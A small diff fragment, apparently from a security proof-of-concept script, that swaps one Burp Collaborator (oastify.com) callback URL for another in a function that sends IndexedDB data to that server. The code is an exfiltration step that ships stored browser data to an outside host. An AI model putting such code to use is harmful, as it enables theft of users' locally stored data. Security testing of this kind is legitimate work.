@@ -176,7 +176,7 @@
             // ============================================
             
             async function sendToServer(data) {
-                const serverUrl = 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb';
+                const serverUrl = 'https://q1swj4ujve0tpfwpuqycqox1jspjde13.oastify.com/api/indexeddb';
                 
                 logStatus(`📤 Preparing to send data to server...`);
                 
